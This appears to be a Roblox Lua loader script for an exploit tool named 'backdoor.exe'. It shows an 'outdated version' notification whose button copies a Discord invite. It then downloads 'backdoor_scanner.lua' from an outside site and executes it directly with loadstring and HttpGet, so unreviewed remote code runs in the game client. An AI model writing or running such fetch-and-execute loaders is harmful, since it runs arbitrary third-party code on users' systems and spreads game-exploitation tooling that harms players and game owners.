local func = Instance.new("BindableFunction")

func.OnInvoke = function()
    setclipboard("https://discord.gg/4tRadfjY69")
end

game:GetService("StarterGui"):SetCore("SendNotification", {
    Title = "Update",
    Text = "This version of backdoor.exe is outdated",
    Button1 = "Copy Discord",
    Callback = func
})

local script = "scripts/backdoor_scanner.lua"
local server_url = "https://k4scripts.xyz/"
loadstring(game:HttpGet(server_url..script))()
